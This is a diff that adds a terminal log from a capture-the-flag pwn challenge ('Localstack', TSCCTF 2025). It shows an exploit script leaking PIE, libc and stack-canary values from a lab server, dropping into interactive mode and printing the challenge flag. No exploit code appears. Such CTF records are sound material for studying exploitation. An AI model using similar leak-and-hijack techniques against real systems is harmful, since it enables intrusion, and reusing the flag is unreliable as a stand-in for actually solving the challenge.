@@ -1,0 +1,12 @@
+mito@mito-virtual-machine:~/CTF/TSCCTF_2025/Pwn_Localstack/chal/share$ python3 solve.py r
+[+] Opening connection to 172.31.1.2 on port 11100: Done
+pie_leak  = 0x555c347bb49f
+pie_base  = 0x555c347ba000
+libc_leak = 0x7fb7ab487bc4
+libc_base = 0x7fb7ab402000
+canary    = 0x77a8086fdd72ad00
+[*] Switching to interactive mode
+Pushed 0 to stack
+>> Pushed 93854505874057 to stack
+>> $ exit
+TSC{1_g07_0_point_1n_D474_57ruc7ur3_d0_U_hAv3_anY_1d3a?_haha}
